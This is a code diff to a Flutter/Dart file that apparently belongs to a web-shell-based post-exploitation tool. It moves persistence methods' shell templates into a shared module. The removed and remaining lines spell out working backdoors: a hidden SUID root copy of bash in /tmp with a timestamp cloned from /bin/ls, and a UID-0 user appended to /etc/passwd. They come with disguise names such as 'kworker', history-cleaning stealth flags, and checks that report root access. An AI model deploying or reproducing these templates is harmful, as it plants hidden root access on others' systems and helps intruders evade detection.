@@ -3,6 +3,7 @@ import 'package:flutter/services.dart';
 
 import '../services/webshell_service.dart';
 import '../theme/app_theme.dart';
+import 'priv_esc_landing.dart';
 
 // ═══════════════════════════════════════════════════════════════════════════════
 // Data models
@@ -190,7 +191,7 @@ String _toDotPath(String path) {
 // Method definitions
 // ═══════════════════════════════════════════════════════════════════════════════
 
-const _allMethods = <_PersistMethod>[
+final _allMethods = <_PersistMethod>[
   // ── Scheduled Tasks ────────────────────────────────────────────────────────
 
   _PersistMethod(
@@ -497,19 +498,18 @@ const _allMethods = <_PersistMethod>[
         'Copy /bin/bash to a hidden location with SUID bit. Execute with `-p` to get root.',
     checkCommand:
         r'[ -w /tmp ] && echo "EXPLOIT:OK:/tmp writable" || echo "EXPLOIT:FAIL:/tmp not writable"; [ "$(id -u)" = "0" ] && echo "EXPLOIT:OK:running as root (SUID will work)" || echo "EXPLOIT:FAIL:not root — chmod 4755 needs root-owned file for root SUID"; echo "=== SUID shells in non-standard paths ===" && find /bin /usr/bin /usr/local/bin /tmp /opt /sbin /usr/sbin /var/tmp -maxdepth 3 -perm -4000 -type f \( -name "bash" -o -name "dash" -o -name "sh" -o -name "zsh" \) 2>/dev/null | grep -v "^/bin/\|^/usr/bin/" | head -10; stat -c "%a %n" /tmp/.[!.]* 2>/dev/null | grep "4755" || echo "(no SUID backdoor found)"',
-    deployTemplate:
-        r"cp /bin/bash /tmp/.{mimic_name} && chmod 4755 /tmp/.{mimic_name} && touch -r /bin/ls /tmp/.{mimic_name} && echo 'DEPLOY_OK' || echo 'DEPLOY_FAILED'",
-    verifyTemplate:
-        '(test -f /tmp/.{mimic_name} && ((stat -c "%a" /tmp/.{mimic_name} 2>/dev/null || stat -f "%p" /tmp/.{mimic_name} 2>/dev/null | tail -c 5) | grep -q 4755) && echo "VERIFY_OK:permissions_4755" || echo "VERIFY_FAILED")',
-    rollbackTemplate:
-        r'rm -f /tmp/.{mimic_name}',
+    // deploy/verify/rollback share the canonical landing templates
+    // (single source of truth in priv_esc_landing.dart).
+    deployTemplate: landingById('suid_shell').deployTemplate,
+    verifyTemplate: landingById('suid_shell').verifyTemplate,
+    rollbackTemplate: landingById('suid_shell').rollbackTemplate,
     preflightCommands: [
       '[ -w /tmp ] && echo "OK:/tmp writable" || echo "FAIL:/tmp not writable"',
       '[ -x /bin/bash ] && echo "OK:/bin/bash exists" || echo "FAIL:/bin/bash not found"',
     ],
     params: [
       _PersistParam(
-        id: 'mimic_name',
+        id: 'mimic',
         label: 'Hidden file name',
         hint: 'e.g. kworker, dbus-daemon, systemd-coredump',
         defaultValue: 'kworker',
@@ -517,10 +517,10 @@ const _allMethods = <_PersistMethod>[
       ),
     ],
     warningText:
-        'Creates a SUID root shell at /tmp/.{name}. Use `/tmp/.{name} -p` to get euid=0. Bash drops SUID by default unless invoked with -p. Hidden by dot-prefix + timestamp cloned from /bin/ls.',
+        'Creates a SUID root shell at a hidden /tmp/.<name>. Use `/tmp/.<name> -p` to get euid=0. Bash drops SUID by default unless invoked with -p.',
     stealth: _MethodStealth(
       canDotPrefix: true,
-      canTimestampClone: true,
+      canTimestampClone: false,
       canHistoryClean: true,
       tsRefFile: '/bin/ls',
     ),
@@ -532,16 +532,14 @@ const _allMethods = <_PersistMethod>[
     description:
         'Add a UID-0 user to /etc/passwd. Log in with `su {username}` to get root.',
     checkCommand:
-        r'[ -w /etc/passwd ] && echo "EXPLOIT:OK:/etc/passwd writable" || echo "EXPLOIT:FAIL:/etc/passwd not writable — need root"; (which python3 >/dev/null 2>&1 || which python >/dev/null 2>&1 || which perl >/dev/null 2>&1 || which ruby >/dev/null 2>&1) && echo "EXPLOIT:OK:crypt tool available (python/perl/ruby)" || echo "EXPLOIT:FAIL:no python, perl, or ruby — cannot generate crypt hash"; cut -d: -f1,3 /etc/passwd 2>/dev/null | grep ":0$" || echo "(no UID 0 entries found)"',
-    deployTemplate:
-        '(python3 -c "import crypt; print(crypt.crypt(\'{password}\', \'{salt}\'))" 2>/dev/null || python -c "import crypt; print(crypt.crypt(\'{password}\', \'{salt}\'))" 2>/dev/null || perl -e "print crypt(\'{password}\', \'{salt}\')" 2>/dev/null || ruby -e "puts \'{password}\'.crypt(\'{salt}\')") | xargs -I_H_ echo \'{username}:_H_:0:0:root:/root:/bin/bash\' >> /etc/passwd && echo DEPLOY_OK || echo DEPLOY_FAILED',
-    verifyTemplate:
-        'grep "^{username}:" /etc/passwd 2>/dev/null && [ "\$(grep "^{username}:" /etc/passwd 2>/dev/null | cut -d: -f3)" = "0" ] && echo "VERIFY_OK:UID_0_confirmed" || (grep "^{username}:" /etc/passwd 2>/dev/null && echo "VERIFY_FAILED:UID_not_0" || echo "VERIFY_FAILED")',
-    rollbackTemplate:
-        r"cp /etc/passwd /etc/passwd.bak && sed -i '/^{username}:/d' /etc/passwd",
+        r'[ -w /etc/passwd ] && echo "EXPLOIT:OK:/etc/passwd writable" || echo "EXPLOIT:FAIL:/etc/passwd not writable — need root"; (command -v openssl >/dev/null 2>&1 || command -v perl >/dev/null 2>&1 || command -v ruby >/dev/null 2>&1) && echo "EXPLOIT:OK:crypt tool available (openssl/perl/ruby)" || echo "EXPLOIT:FAIL:no openssl, perl, or ruby — cannot generate crypt hash"; cut -d: -f1,3 /etc/passwd 2>/dev/null | grep ":0$" || echo "(no UID 0 entries found)"',
+    // deploy/verify/rollback share the canonical landing templates.
+    deployTemplate: landingById('passwd_user').deployTemplate,
+    verifyTemplate: landingById('passwd_user').verifyTemplate,
+    rollbackTemplate: landingById('passwd_user').rollbackTemplate,
     preflightCommands: [
       '[ -w /etc/passwd ] && echo "OK:/etc/passwd writable" || echo "FAIL:/etc/passwd not writable (need root)"',
-      '(which python3 >/dev/null 2>&1 || which python >/dev/null 2>&1 || which perl >/dev/null 2>&1 || which ruby >/dev/null 2>&1) && echo "OK:crypt tool available (python/perl/ruby)" || echo "FAIL:no python, perl, or ruby — cannot generate crypt hash"',
+      '(command -v openssl >/dev/null 2>&1 || command -v perl >/dev/null 2>&1 || command -v ruby >/dev/null 2>&1) && echo "OK:crypt tool available (openssl/perl/ruby)" || echo "FAIL:no openssl, perl, or ruby — cannot generate crypt hash"',
     ],
     params: [
       _PersistParam(
@@ -567,7 +565,7 @@ const _allMethods = <_PersistMethod>[
         'Requires root. Adds a UID-0 user to /etc/passwd. Choose a username that looks like a system daemon. Original passwd is backed up to /etc/passwd.bak.',
     stealth: _MethodStealth(
       canDotPrefix: false,
-      canTimestampClone: true,
+      canTimestampClone: false,
       canHistoryClean: true,
       tsRefFile: '/etc/passwd',
     ),
@@ -703,7 +701,9 @@ bool _parseDeploySuccess(String raw) {
 }
 
 bool _parseVerifySuccess(String raw) {
-  return raw.contains('VERIFY_OK');
+  return raw.contains('VERIFY_OK') ||
+      raw.contains('uid=0(root)') ||
+      raw.contains('euid=0(root)');
 }
 
 // ── Individual parsers ───────────────────────────────────────────────────────
